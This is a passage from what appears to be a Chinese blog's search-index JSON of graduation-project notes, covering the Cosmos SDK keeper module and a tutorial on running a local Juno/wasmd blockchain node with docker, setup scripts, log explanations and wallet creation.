<strong>状态管理</strong></h3>\n<ul>\n<li><code>keeper</code>\n文件夹还包含状态管理相关的逻辑，用于直接与区块链的存储层交互。<code>Keeper</code>\n结构体会使用存储器访问模块的状态数据，并提供创建、读取、更新和删除（CRUD）操作。</li>\n<li>这些状态管理函数确保数据的持久性和一致性。例如，可以有\n<code>SetData</code> 和 <code>GetData</code>\n函数，用于写入和读取模块数据。</li>\n</ul>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(k Keeper)</span></span> SetData(ctx sdk.Context, key <span class=\"type\">string</span>, value <span class=\"type\">string</span>) {</span><br><span class=\"line\">    store := ctx.KVStore(k.storeKey)</span><br><span class=\"line\">    store.Set([]<span class=\"type\">byte</span>(key), []<span class=\"type\">byte</span>(value))</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(k Keeper)</span></span> GetData(ctx sdk.Context, key <span class=\"type\">string</span>) (<span class=\"type\">string</span>, <span class=\"type\">error</span>) {</span><br><span class=\"line\">    store := ctx.KVStore(k.storeKey)</span><br><span class=\"line\">    bz := store.Get([]<span class=\"type\">byte</span>(key))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> bz == <span class=\"literal\">nil</span> {</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>, errors.New(<span class=\"string\">\"not found\"</span>)</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"type\">string</span>(bz), <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"事件记录\">6. <strong>事件记录</strong></h3>\n<ul>\n<li>在某些业务逻辑中，<code>Keeper</code>\n还会使用事件记录来追踪操作。这些事件可以用于链上和链下分析，如记录交易或数据更新。</li>\n<li>事件记录通常通过 <code>ctx.EventManager()</code>\n生成，并随模块的操作一起写入区块链日志。</li>\n</ul>\n<h3 id=\"总结-1\">总结</h3>\n<p><code>keeper</code> 文件夹在 Cosmos SDK\n模块中扮演了核心角色，负责管理模块的业务逻辑、查询和状态存储。它为模块提供了统一的接口与其他模块和存储进行交互，确保数据操作的安全性和一致性。</p>\n","categories":["笔记"],"tags":["区块链","毕设","Cosmos","Go"]},{"title":"毕设09 - 毕业实训 & 专利撰写","url":"/graduation-project/09/","content":"<p>专利的部分不能发博客。</p>\n<span id=\"more\"></span>\n<p>加密内容◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️◼️</p>\n","categories":["笔记"],"tags":["毕设","软著"]},{"title":"毕设10 - Juno(wasmd) 初见，节点部署和简单功能实践","url":"/graduation-project/10/","content":"<p>本文写作时 Juno 版本：v25.0.0-2-gd47e0713</p>\n<p>还有官方 GPTs：Juno Simpler，数据库大概是 v12\n左右的，但是还不错基本问题都能解决。</p>\n<p>Juno 是在 wasmd 的基础上开发的，我误打误撞从 Juno 开始学习了。\n本文的内容几乎可以直接迁移到 wasmd\n使用和学习中，部分区别我在章节末作出了补充。 <del>（只要全文替换 juno 为\nwasm ，修改仓库和docker地址，就是 wasmd 的初见教程了）</del></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Nvc21vc0NvbnRyYWN0cy9KdW5v\">Juno 仓库<i class=\"fa fa-external-link-alt\"></i></span> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Nvc21XYXNtL3dhc21kL3RyZWUvbWFpbg==\">wasmd仓库<i class=\"fa fa-external-link-alt\"></i></span></p>\n<span id=\"more\"></span>\n<h1 id=\"运行-juno-本地节点\">1 运行 Juno 本地节点</h1>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/CosmosContracts/juno.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> juno</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n<h2 id=\"docker\">1.1 Docker</h2>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it --<span class=\"built_in\">rm</span> -p 26657:26657 -p 26656:26656 -p 1317:1317 -p 9090:9090 \\</span><br><span class=\"line\">  ghcr.io/cosmoscontracts/juno:latest ./setup_and_run.sh</span><br></pre></td></tr></table></figure>\n<p>当 Docker 容器启动后，你可以通过以下命令确认节点是否运行正常：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http://localhost:26657/status</span><br></pre></td></tr></table></figure>\n<p>如果节点运行正常，会收到 JSON 格式的状态信息。</p>\n<p>但是发现这个 latest 版本才到 v12。手动换到最新的 v25。</p>\n<blockquote>\n<p>查看版本：https://github.com/CosmosContracts/juno/pkgs/container/juno/versions?filters%5Bversion_type%5D=tagged</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull ghcr.io/cosmoscontracts/juno:25 </span><br></pre></td></tr></table></figure>\n<p>该版本docker镜像仍存在问题，<code>/opt/run_junod.sh</code> 中设置\n<code>--minimum-gas-prices 0.0001ujunox</code> 代币类型是\n<code>ujunox</code> ，而 <code>setup_junod.sh</code> 中设置的代币类型是\n<code>ustake</code> 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi /opt/run_junod.sh</span><br></pre></td></tr></table></figure>\n<p>修改代币类型为 <code>ustake</code>\n后，退出容器，将其保存为新的镜像：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(in docker) # exit</span><br><span class=\"line\">docker commit &lt;my_container_name&gt; &lt;new_image_name&gt;</span><br></pre></td></tr></table></figure>\n<p>然后启动新的镜像：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run --rm -it -p 26657:26657 --name my-juno-local &lt;new_image_name&gt; ./setup_and_run.sh</span><br><span class=\"line\">docker run --rm -it -p 26657:26657 --name my-juno-local my_juno25 ./setup_and_run.sh</span><br></pre></td></tr></table></figure>\n<h3 id=\"补充\">补充</h3>\n<p>wasmd 的 docker 为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cosmwasm/wasmd:latest</span><br></pre></td></tr></table></figure>\n<p>直接使用 wasmd 的镜像不需要以上复杂的修改。</p>\n<h2 id=\"本地脚本运行\">1.2 本地脚本运行</h2>\n<p><code>./setup_junod.sh [其他账户]</code></p>\n<p>可以直接创建其他账户，但是必须提前使用\n<code>junod keys add &lt;账户名称&gt; $KEYRING</code> 创建好。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\">#set -o errexit -o nounset -o pipefail</span></span><br><span class=\"line\"></span><br><span class=\"line\">PASSWORD=<span class=\"variable\">${PASSWORD:-1234567890}</span></span><br><span class=\"line\">STAKE=<span class=\"variable\">${STAKE_TOKEN:-ustake}</span></span><br><span class=\"line\">FEE=<span class=\"variable\">${FEE_TOKEN:-ucosm}</span></span><br><span class=\"line\">CHAIN_ID=<span class=\"variable\">${CHAIN_ID:-testing}</span></span><br><span class=\"line\">MONIKER=<span class=\"variable\">${MONIKER:-node001}</span></span><br><span class=\"line\">KEYRING=<span class=\"string\">\"--keyring-backend test\"</span></span><br><span class=\"line\">TIMEOUT_COMMIT=<span class=\"variable\">${TIMEOUT_COMMIT:-5s}</span></span><br><span class=\"line\">BLOCK_GAS_LIMIT=<span class=\"variable\">${GAS_LIMIT:-10000000}</span> <span class=\"comment\"># should mirror mainnet</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"Configured Block Gas Limit: <span class=\"variable\">$BLOCK_GAS_LIMIT</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># check the genesis file</span></span><br><span class=\"line\">GENESIS_FILE=<span class=\"string\">\"<span class=\"variable\">$HOME</span>\"</span>/.juno/config/genesis.json</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -f <span class=\"string\">\"<span class=\"variable\">$GENESIS_FILE</span>\"</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$GENESIS_FILE</span> exists...\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$GENESIS_FILE</span> does not exist. Generating...\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">  junod init --chain-id <span class=\"string\">\"<span class=\"variable\">$CHAIN_ID</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$MONIKER</span>\"</span></span><br><span class=\"line\">  junod add-ica-config</span><br><span class=\"line\">  <span class=\"comment\"># staking/governance token is hardcoded in config, change this</span></span><br><span class=\"line\">  sed -i <span class=\"string\">\"s/\\\"stake\\\"/\\\"<span class=\"variable\">$STAKE</span>\\\"/\"</span> <span class=\"string\">\"<span class=\"variable\">$GENESIS_FILE</span>\"</span></span><br><span class=\"line\">  <span class=\"comment\"># this is essential for sub-1s block times (or header times go crazy)</span></span><br><span class=\"line\">  sed -i <span class=\"string\">'s/\"time_iota_ms\": \"1000\"/\"time_iota_ms\": \"10\"/'</span> <span class=\"string\">\"<span class=\"variable\">$GENESIS_FILE</span>\"</span></span><br><span class=\"line\">  <span class=\"comment\"># change gas limit to mainnet value</span></span><br><span class=\"line\">  sed -i <span class=\"string\">'s/\"max_gas\": \"-1\"/\"max_gas\": \"'</span><span class=\"string\">\"<span class=\"variable\">$BLOCK_GAS_LIMIT</span>\"</span><span class=\"string\">'\"/'</span> <span class=\"string\">\"<span class=\"variable\">$GENESIS_FILE</span>\"</span></span><br><span class=\"line\">  <span class=\"comment\"># change default keyring-backend to test</span></span><br><span class=\"line\">  sed -i <span class=\"string\">'s/keyring-backend = \"os\"/keyring-backend = \"test\"/'</span> <span class=\"string\">\"<span class=\"variable\">$HOME</span>\"</span>/.juno/config/client.toml</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">APP_TOML_CONFIG=<span class=\"string\">\"<span class=\"variable\">$HOME</span>\"</span>/.juno/config/app.toml</span><br><span class=\"line\">APP_TOML_CONFIG_NEW=<span class=\"string\">\"<span class=\"variable\">$HOME</span>\"</span>/.juno/config/app_new.toml</span><br><span class=\"line\">CONFIG_TOML_CONFIG=<span class=\"string\">\"<span class=\"variable\">$HOME</span>\"</span>/.juno/config/config.toml</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -n <span class=\"string\">\"<span class=\"variable\">$UNSAFE_CORS</span>\"</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"Unsafe CORS set... updating app.toml and config.toml\"</span></span><br><span class=\"line\">  <span class=\"comment\"># sorry about this bit, but toml is rubbish for structural editing</span></span><br><span class=\"line\">  sed -n <span class=\"string\">'1h;1!H;${g;s/# Enable defines if the API server should be enabled.\\nenable = false/enable = true/;p;}'</span> <span class=\"string\">\"<span class=\"variable\">$APP_TOML_CONFIG</span>\"</span> &gt; <span class=\"string\">\"<span class=\"variable\">$APP_TOML_CONFIG_NEW</span>\"</span></span><br><span class=\"line\">  <span class=\"built_in\">mv</span> <span class=\"string\">\"<span class=\"variable\">$APP_TOML_CONFIG_NEW</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$APP_TOML_CONFIG</span>\"</span></span><br><span class=\"line\">  <span class=\"comment\"># ...and breathe</span></span><br><span class=\"line\">  sed -i <span class=\"string\">\"s/enabled-unsafe-cors = false/enabled-unsafe-cors = true/\"</span> <span class=\"string\">\"<span class=\"variable\">$APP_TOML_CONFIG</span>\"</span></span><br><span class=\"line\">  sed -i <span class=\"string\">\"s/cors_allowed_origins = \\[\\]/cors_allowed_origins = \\[\\\"\\*\\\"\\]/\"</span> <span class=\"string\">\"<span class=\"variable\">$CONFIG_TOML_CONFIG</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># speed up block times for testing environments</span></span><br><span class=\"line\">sed -i <span class=\"string\">\"s/timeout_commit = \\\"5s\\\"/timeout_commit = \\\"<span class=\"variable\">$TIMEOUT_COMMIT</span>\\\"/\"</span> <span class=\"string\">\"<span class=\"variable\">$CONFIG_TOML_CONFIG</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># are we running for the first time?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ! junod keys show validator <span class=\"variable\">$KEYRING</span>; <span class=\"keyword\">then</span></span><br><span class=\"line\">  (<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>) | junod keys add validator <span class=\"variable\">$KEYRING</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># hardcode the validator account for this instance</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span> | junod genesis add-genesis-account validator <span class=\"string\">\"1000000000<span class=\"variable\">$STAKE</span>,1000000000<span class=\"variable\">$FEE</span>\"</span> <span class=\"variable\">$KEYRING</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># (optionally) add a few more genesis accounts</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> addr <span class=\"keyword\">in</span> <span class=\"string\">\"<span class=\"variable\">$@</span>\"</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"variable\">$addr</span></span><br><span class=\"line\">    junod genesis add-genesis-account <span class=\"string\">\"<span class=\"variable\">$addr</span>\"</span> <span class=\"string\">\"1000000000<span class=\"variable\">$STAKE</span>,1000000000<span class=\"variable\">$FEE</span>,5000000000uusd\"</span></span><br><span class=\"line\">  <span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># submit a genesis validator tx</span></span><br><span class=\"line\">  <span class=\"comment\">## Workraround for https://github.com/cosmos/cosmos-sdk/issues/8251</span></span><br><span class=\"line\">  (<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>) | junod genesis gentx validator <span class=\"string\">\"250000000<span class=\"variable\">$STAKE</span>\"</span> --chain-id=<span class=\"string\">\"<span class=\"variable\">$CHAIN_ID</span>\"</span> --amount=<span class=\"string\">\"250000000<span class=\"variable\">$STAKE</span>\"</span> <span class=\"variable\">$KEYRING</span></span><br><span class=\"line\">  <span class=\"comment\">## should be:</span></span><br><span class=\"line\">  <span class=\"comment\"># (echo \"$PASSWORD\"; echo \"$PASSWORD\"; echo \"$PASSWORD\") | junod genesis gentx validator \"250000000$STAKE\" --chain-id=\"$CHAIN_ID\"</span></span><br><span class=\"line\">  junod genesis collect-gentxs</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<p><code>run_junod.sh</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">test</span> -n <span class=\"string\">\"<span class=\"variable\">$1</span>\"</span>; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"comment\"># need -R not -r to copy hidden files</span></span><br><span class=\"line\">    <span class=\"built_in\">cp</span> -R <span class=\"string\">\"<span class=\"variable\">$1</span>/.juno\"</span> /root</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /root/log</span><br><span class=\"line\">junod start --rpc.laddr tcp://0.0.0.0:26657 --minimum-gas-prices 0.0001ustake --trace</span><br></pre></td></tr></table></figure>\n<p><code>setup_and_run.sh</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">test</span> -n <span class=\"string\">\"<span class=\"variable\">$1</span>\"</span>; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"comment\"># need -R not -r to copy hidden files</span></span><br><span class=\"line\">    <span class=\"built_in\">cp</span> -R <span class=\"string\">\"<span class=\"variable\">$1</span>/.wasmd\"</span> /root</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /root/log</span><br><span class=\"line\">wasmd start --rpc.laddr tcp://0.0.0.0:26657 --trace</span><br></pre></td></tr></table></figure>\n<h3 id=\"补充-1\">补充</h3>\n<p>Juno 脚本在 wasmd 上进行了一些参数调整，wasmd\n的更简洁，适合学习：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\">#set -o errexit -o nounset -o pipefail</span></span><br><span class=\"line\"></span><br><span class=\"line\">PASSWORD=<span class=\"variable\">${PASSWORD:-1234567890}</span></span><br><span class=\"line\">STAKE=<span class=\"variable\">${STAKE_TOKEN:-ustake}</span></span><br><span class=\"line\">FEE=<span class=\"variable\">${FEE_TOKEN:-ucosm}</span></span><br><span class=\"line\">CHAIN_ID=<span class=\"variable\">${CHAIN_ID:-testing}</span></span><br><span class=\"line\">MONIKER=<span class=\"variable\">${MONIKER:-node001}</span></span><br><span class=\"line\"></span><br><span class=\"line\">wasmd init --chain-id <span class=\"string\">\"<span class=\"variable\">$CHAIN_ID</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$MONIKER</span>\"</span></span><br><span class=\"line\"><span class=\"comment\"># staking/governance token is hardcoded in config, change this</span></span><br><span class=\"line\">sed -i <span class=\"string\">\"s/\\\"stake\\\"/\\\"<span class=\"variable\">$STAKE</span>\\\"/\"</span> <span class=\"string\">\"<span class=\"variable\">$HOME</span>\"</span>/.wasmd/config/genesis.json</span><br><span class=\"line\"><span class=\"comment\"># this is essential for sub-1s block times (or header times go crazy)</span></span><br><span class=\"line\">sed -i <span class=\"string\">'s/\"time_iota_ms\": \"1000\"/\"time_iota_ms\": \"10\"/'</span> <span class=\"string\">\"<span class=\"variable\">$HOME</span>\"</span>/.wasmd/config/genesis.json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ! wasmd keys show validator; <span class=\"keyword\">then</span></span><br><span class=\"line\">  (<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>) | wasmd keys add validator</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"comment\"># hardcode the validator account for this instance</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span> | wasmd genesis add-genesis-account validator <span class=\"string\">\"1000000000<span class=\"variable\">$STAKE</span>,1000000000<span class=\"variable\">$FEE</span>\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># (optionally) add a few more genesis accounts</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> addr <span class=\"keyword\">in</span> <span class=\"string\">\"<span class=\"variable\">$@</span>\"</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"variable\">$addr</span></span><br><span class=\"line\">  wasmd genesis add-genesis-account <span class=\"string\">\"<span class=\"variable\">$addr</span>\"</span> <span class=\"string\">\"1000000000<span class=\"variable\">$STAKE</span>,1000000000<span class=\"variable\">$FEE</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># submit a genesis validator tx</span></span><br><span class=\"line\"><span class=\"comment\">## Workraround for https://github.com/cosmos/cosmos-sdk/issues/8251</span></span><br><span class=\"line\">(<span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>; <span class=\"built_in\">echo</span> <span class=\"string\">\"<span class=\"variable\">$PASSWORD</span>\"</span>) | wasmd genesis gentx validator <span class=\"string\">\"250000000<span class=\"variable\">$STAKE</span>\"</span> --chain-id=<span class=\"string\">\"<span class=\"variable\">$CHAIN_ID</span>\"</span> --amount=<span class=\"string\">\"250000000<span class=\"variable\">$STAKE</span>\"</span></span><br><span class=\"line\"><span class=\"comment\">## should be:</span></span><br><span class=\"line\"><span class=\"comment\"># (echo \"$PASSWORD\"; echo \"$PASSWORD\"; echo \"$PASSWORD\") | wasmd gentx validator \"250000000$STAKE\" --chain-id=\"$CHAIN_ID\"</span></span><br><span class=\"line\">wasmd genesis collect-gentxs</span><br></pre></td></tr></table></figure>\n<h2 id=\"分析输出信息\">1.3 分析输出信息</h2>\n<p>从你提供的节点输出日志来看，运行的节点正在正常参与区块链网络的共识和状态更新流程。以下是日志中各部分的解析：</p>\n<h3 id=\"关键信息解析\">1.3.1 关键信息解析</h3>\n<ol type=\"1\">\n<li><p><strong>区块执行和状态提交</strong></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF executed block height=171 module=state num_invalid_txs=0 num_valid_txs=0</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：第 171\n个区块已经被成功执行。没有无效交易（<code>num_invalid_txs=0</code>），也没有有效交易（<code>num_valid_txs=0</code>）。</li>\n<li><strong>模块</strong>：<code>state</code>\n模块负责应用区块内容并更新状态。</li>\n</ul>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF committed state app_hash=30D13E32FA9357F0C27B6A5DC48E65E99EA2C302B3CEEED4F44A673BA1D85AEC height=171 module=state num_txs=0</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：第 171\n个区块的状态变更已被提交，<code>app_hash</code>\n是状态哈希，用于验证状态一致性。</li>\n<li><strong>模块</strong>：<code>state</code> 模块。</li>\n</ul>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF indexed block events height=171 module=txindex</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：与第 171\n个区块相关的事件（如交易）已被索引，便于后续查询。</li>\n<li><strong>模块</strong>：<code>txindex</code> 模块（交易索引）。</li>\n</ul></li>\n<li><p><strong>新高度的启动</strong></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF Timed out dur=1994.796713 height=172 module=consensus round=0 step=RoundStepNewHeight</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：网络进入了新的区块高度（172）的第 0\n轮共识阶段。这表明之前的区块已完成处理，节点正在准备生成新的区块。</li>\n</ul></li>\n<li><p><strong>提案接收与共识</strong></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF received proposal module=consensus proposal=\"Proposal{172/0 (...)}\"</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：节点收到了高度为 172\n的区块提案（<code>proposal</code>），提议者是\n<code>3DAD15B485682FBD43119CDDE685C5142B9B0915</code>。</li>\n<li><strong>模块</strong>：<code>consensus</code> 模块。</li>\n</ul>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF received complete proposal block hash=01B19714D56F0DB95008F250E626B8E3531AE5A74AA3FBB22768991CD3450D4B height=172 module=consensus</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：节点接收到了完整的提案，包含区块的哈希（<code>block hash</code>）。</li>\n<li><strong>模块</strong>：<code>consensus</code> 模块。</li>\n</ul>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF finalizing commit of block hash=01B19714D56F0DB95008F250E626B8E3531AE5A74AA3FBB22768991CD3450D4B height=172 module=consensus num_txs=0</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：节点达成共识并提交高度为 172\n的区块，区块内没有交易。</li>\n</ul></li>\n<li><p><strong>铸造代币</strong></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF minted coins from module account amount=63ustake from=mint module=x/bank</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：区块链网络铸造了 63 个单位的\n<code>ustake</code> 代币（可能是通胀奖励或区块奖励）。</li>\n</ul></li>\n<li><p><strong>确保网络连接</strong></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF Ensure peers module=pex numDialing=0 numInPeers=0 numOutPeers=0 numToDial=10</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：节点当前没有入站或出站的网络连接，但它尝试拨号以连接到其他节点（最大\n10 个节点）。</li>\n<li><strong>模块</strong>：<code>pex</code>\n模块（负责点对点连接管理）。</li>\n</ul>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INF No addresses to dial. Falling back to seeds module=pex</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>含义</strong>：没有可用的节点地址用于连接，节点将回退到预设的种子节点。</li>\n</ul></li>\n</ol>\n<h3 id=\"总结\">1.3.2 总结</h3>\n<ul>\n<li>节点正在正常运行，且成功参与了网络共识流程。</li>\n<li>当前的区块中没有有效交易（所有\n<code>num_valid_txs=0</code>），可能是因为没有用户向链发送交易。</li>\n<li>状态哈希（<code>app_hash</code>）验证了区块链状态的一致性。</li>\n<li>节点正在尝试建立与其他节点的连接，但暂时没有连接上，可能需要检查网络配置或种子节点的可用性。</li>\n</ul>\n<h1 id=\"简单测试\">2 简单测试</h1>\n<p>为了模拟远程网络环境（即本地通过 rpc/http 请求访问区块链），按照 1.1\n节的方式，使用修改后的docker镜像启动节点：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -p 26657:26657 --name my-juno-local my_juno25 ./setup_and_run.sh</span><br></pre></td></tr></table></figure>\n<p>为了方便关机后恢复区块链的状态，不添加 <code>--rm</code> 选项。通过\nlog 实时获取区块链的输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker log -f my-juno-local</span><br></pre></td></tr></table></figure>\n<p>以下提到的 <strong>本地</strong> 即宿主机，模拟普通用户通过 junod\n来访问区块链。</p>\n<p><code>~/.juno/config/client.toml</code> 中设置了 <code>junod</code>\n作为客户端的配置，将其修改为：</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">chain-id</span> = <span class=\"string\">\"testing\"</span></span><br><span class=\"line\"><span class=\"attr\">keyring-backend</span> = <span class=\"string\">\"test\"</span></span><br><span class=\"line\"><span class=\"attr\">output</span> = <span class=\"string\">\"text\"</span></span><br><span class=\"line\"><span class=\"attr\">node</span> = <span class=\"string\">\"tcp://localhost:26657\"</span></span><br><span class=\"line\"><span class=\"attr\">broadcast-mode</span> = <span class=\"string\">\"sync\"</span></span><br></pre></td></tr></table></figure>\n<p>并且记住，stake 和 交易货币的名字：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">STAKE=ustake</span><br><span class=\"line\">FEE=ucosm</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建本地钱包并转账\">2.1 创建本地钱包，并转账</h2>\n<h3 id=\"创建本地钱包\">1 创建本地钱包</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod keys add mywallet</span><br></pre></td></tr></table></figure>\n<p>这一步并不需要和区块链交互，只是在本地的\n<code>~/.juno/keyring-test</code> 中生成了 <code>mywallet.info</code>\n。</p>\n<p>检查是否已创建钱包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod keys show mywallet </span><br></pre></td></tr></table></figure>\n<p>只获取钱包的地址（-a, address）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod keys show mywallet -a</span><br></pre></td></tr></table></figure>\n<p>钱包地址例如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">juno1ddtgryk2xgt3qlsrx8z2kat9gpluw8886wpwhu</span><br></pre></td></tr></table></figure>\n<p>此时在本地创建了一个名叫 <code>mywallet</code>\n的钱包，里面什么资产都没有。</p>\n<p>查询钱包余额：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">junod query bank balances 